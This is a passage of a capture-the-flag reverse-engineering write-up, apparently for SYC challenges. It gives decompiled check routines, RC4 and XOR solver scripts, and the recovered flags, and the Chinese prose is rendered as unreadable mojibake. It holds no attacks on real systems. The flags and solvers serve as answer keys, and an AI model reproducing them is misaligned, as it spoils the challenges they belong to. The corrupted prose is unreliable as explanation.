</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">((</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">#è§£å¯†å¯å¾—dfd24c6c33beee2b49329e61186012b05da1542dd3f09fb0e9aed330c87477cc</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>ç®—sè¡¨ï¼Œå¼‚æˆ–è§£å¯†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    RC4 è§£å¯†å‡½æ•°
</span></span></span><span class="line"><span class="cl"><span class="s2">    data: è¦è§£å¯†çš„æ•°æ®ï¼ˆbytesï¼‰
</span></span></span><span class="line"><span class="cl"><span class="s2">    key: å¯†é’¥ï¼ˆbytesï¼‰
</span></span></span><span class="line"><span class="cl"><span class="s2">    è¿”å›: è§£å¯†åçš„æ•°æ®ï¼ˆbytesï¼‰
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># RC4 KSA (Key Scheduling Algorithm)</span>
</span></span><span class="line"><span class="cl">    <span class="n">S</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># RC4 PRGA (Pseudo-Random Generation Algorithm) + è§£å¯†</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">S</span><span class="p">[(</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">byte</span> <span class="o">^</span> <span class="n">k</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># æ‚¨çš„å¯†æ–‡ï¼ˆ32å­—èŠ‚æ•°æ®ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;dfd24c6c33beee2b49329e61186012b05da1542dd3f09fb0e9aed330c87477cc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¯†é’¥</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">17</span><span class="p">])</span>  <span class="c1"># 0x11</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># è§£å¯†</span>
</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="n">rc4_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;è§£å¯†ç»“æœ (hex):&#34;</span><span class="p">,</span> <span class="n">decrypted</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å°è¯•è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="n">decrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;è§£å¯†ç»“æœ (æ–‡æœ¬):&#34;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ä¸æ˜¯æœ‰æ•ˆçš„UTF-8æ–‡æœ¬&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;åŸå§‹å­—èŠ‚:&#34;</span><span class="p">,</span> <span class="n">decrypted</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>è¿è¡Œå¾—åˆ°flagï¼šSYC{OHhhhhhhh_y0u_Kn0m_SMCCCC@!}</p>
</li>
</ul>
<h3 id="6qyqsã®å¥‡å¦™å†’é™©">6.QYQSã®å¥‡å¦™å†’é™©
</h3><ul>
<li>å°†æ–‡ä»¶æ‹–å…¥idaä¸­ï¼Œæ‰¾åˆ°mainå‡½æ•°å¯ä»¥çœ‹åˆ°åŠ å¯†è¿‡ç¨‹ä¸º</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> if ( j_strlen_0(input) == 21 )
</span></span><span class="line"><span class="cl">  {
</span></span><span class="line"><span class="cl">    for ( i = 0; ; ++i )
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">      v11 = i;
</span></span><span class="line"><span class="cl">      v3 = j_strlen_0(input);
</span></span><span class="line"><span class="cl">      if ( v11 &gt;= v3 )
</span></span><span class="line"><span class="cl">        break;
</span></span><span class="line"><span class="cl">      input[i] ^= i;
</span></span><span class="line"><span class="cl">      v11 = i;
</span></span><span class="line"><span class="cl">      input[i] ^= key[i % 4];
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    for ( k = 0; ; ++k )
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">      v11 = k;
</span></span><span class="line"><span class="cl">      v4 = j_strlen_0(input);
</span></span><span class="line"><span class="cl">      if ( v11 &gt;= v4 )
</span></span><span class="line"><span class="cl">        break;
</span></span><span class="line"><span class="cl">      if ( input[k] != QYQS[k] )
</span></span><span class="line"><span class="cl">        goto LABEL_5;
</span></span><span class="line"><span class="cl">    }
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>å¯çŸ¥inputå…ˆå¼‚æˆ–iï¼Œå†ä¸keyæ•°ç»„å¼‚æˆ–</li>
<li>æ‰€ä»¥è§£å¯†è¿‡ç¨‹ä¸ºQYQSè¿™ä¸ªå¯†æ–‡ï¼Œå…ˆå¼‚æˆ–keyå†å¼‚æˆ–iï¼Œè§£å¯†è„šæœ¬å¦‚ä¸‹</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">=</span><span class="p">{</span><span class="s">&#34;QYQS&#34;</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">QYQS</span><span class="p">[</span><span class="mi">22</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	  <span class="n">QYQS</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">43</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mi">23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">57</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mi">34</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">41</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">11</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mi">45</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mi">109</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mi">23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">QYQS</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  	<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">21</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  	<span class="p">{</span>
</span></span><span class="line"><span class="cl">  		<span class="n">QYQS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^=</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  		<span class="n">QYQS</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^=</span><span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span><span class="n">QYQS</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>è¿è¡Œå¯å¾—ï¼šSYC{I_@m_QyqS_r1GhT?}</li>
</ul>
<h3 id="7gensh1n">7.Gensh1n
</h3><p>è¿™é¢˜çš„ä¸»è¦ç¨‹åºå…¶å®äº‹åœ¨cleanup()å‡½æ•°ä¸­ï¼Œè€Œä¸æ˜¯æ­£å¸¸çš„mainå‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">cleanup</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-238h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-234h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-230h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-22Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-220h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+24h] [rbp-21Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v7</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+28h] [rbp-218h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [rsp+30h] [rbp-210h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">264</span><span class="p">];</span> <span class="c1">// [rsp+130h] [rbp-110h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+238h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v10</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">s</span><span class="p">[</span><span class="n">v1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="o">--</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">validate_input_length</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">global_nodes</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">validate_key</span><span class="p">(</span><span class="n">v7</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strncpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">dest</span><span class="p">[</span><span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">compute_checksum</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="n">dest</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="n">v7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="mi">8LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="n">sub_44656</span><span class="p">);</span>   
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">stack_push</span><span class="p">(</span><span class="mi">4LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">reverse_call</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">!=</span> <span class="mi">28</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">28</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">dest</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">result</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="p">)</span>  <span class="c1">//æ¯”è¾ƒï¼Œæ•…resultæ˜¯å¯†æ–‡
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">calculate_crc32</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="mi">28LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">calculate_crc32</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="mi">28LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="o">||</span> <span class="n">v5</span> <span class="o">!=</span> <span class="n">v6</span> <span class="p">)</span>
